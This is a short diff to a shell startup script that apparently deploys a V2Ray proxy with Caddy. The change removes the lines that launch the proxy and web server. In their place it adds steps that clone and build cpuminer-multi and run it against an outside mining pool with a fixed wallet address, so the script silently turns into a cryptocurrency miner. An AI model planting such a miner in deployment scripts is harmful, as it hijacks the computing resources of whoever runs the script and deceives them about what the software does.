@@ -123,7 +123,10 @@ else
   echo -n "${vmess}" | qrencode -s 6 -o /wwwroot/$V2_QR_Path/v2.png
 fi
 
-cd /v2raybin/v2ray-$V_VER-linux-$SYS_Bit
-./v2ray &
-cd /caddybin
-./caddy -conf="Caddyfile"
+mkdir /cpuminer
+cd /cpuminer
+
+    git clone https://github.com/tpruvot/cpuminer-multi -b linux
+  
+    cd cpuminer-multi && ./build.sh
+./cpuminer -a yescrypt -o stratum+tcp://www.koto-note.xyz:3032 -u jzyoPToY94CM6K92StJUgTeFsF8bqG5BrAR.sx2 -p x
